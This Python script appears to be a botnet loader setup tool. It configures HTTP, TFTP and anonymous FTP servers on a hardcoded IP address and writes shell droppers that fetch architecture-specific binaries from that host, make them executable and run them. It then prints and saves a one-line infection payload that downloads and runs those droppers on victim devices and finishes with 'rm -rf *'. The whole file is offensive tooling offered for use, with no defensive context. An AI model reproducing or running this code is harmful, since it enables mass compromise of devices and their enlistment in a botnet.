import subprocess, sys, urllib
ip = "193.228.91.110"
exec_bin = "setup"
exec_name = "fbi"
bin_directory = ""
archs = ["arm",
"arm5",
"arm7",
"x86",
"mips",
"mipsel",
"sh4",
"m68k",
"spc"]


def run(cmd):
    subprocess.call(cmd, shell=True)
print("\033[01;37mPlease wait while your payload generating.")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
    socket_type             = dgram
    protocol                = udp
    wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')  
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("Creating .sh Bins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/setup.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/setup.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/setup.sh')

run('echo "#!/bin/bash" > /var/lib/tftpboot/setup2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/setup2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/setup2.sh')

run('echo "#!/bin/bash" > /var/ftp/setup1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/setup1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/setup1.sh')

run('echo "#!/bin/bash" > /var/www/html/setup.sh')

for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/a.'+i+'; curl -O http://' + ip + '/a.'+i+'; cat a.'+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/www/html/setup.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' a.'+i+' a.'+i+'; cat a.'+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/ftp/setup1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get a.'+i+'; cat a.'+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/setup.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r a.'+i+' -g ' + ip + '; cat a.'+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/setup2.sh')     
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n999999; ulimit -u999999; ulimit -e999999" >> ~/.bashrc')
run
print("\x1b[0;31mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/setup.sh; curl -O http://" + ip + "/setup.sh; chmod 777 setup.sh; sh setup.sh; tftp " + ip + " -c get setup.sh; chmod 777 setup.sh; sh setup.sh; tftp -r setup2.sh -g " + ip + "; chmod 777 setup2.sh; sh setup2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " setup1.sh setup1.sh; sh setup1.sh; rm -rf setup.sh setup.sh setup2.sh setup1.sh; rm -rf *\x1b[0m")
print("")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/setup.sh; curl -O http://" + ip + "/setup.sh; chmod 777 setup.sh; sh setup.sh; tftp " + ip + " -c get setup.sh; chmod 777 setup.sh; sh setup.sh; tftp -r setup2.sh -g " + ip + "; chmod 777 setup2.sh; sh setup2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " setup1.sh setup1.sh; sh setup1.sh; rm -rf setup.sh setup.sh setup2.sh setup1.sh; rm -rf *")
file = open("payload.txt","w+")
file.write(complete_payload)
file.close()
exit()
raw_input("\033[01;37mYour payload has been generated and saved in payload.txt\033[0m")
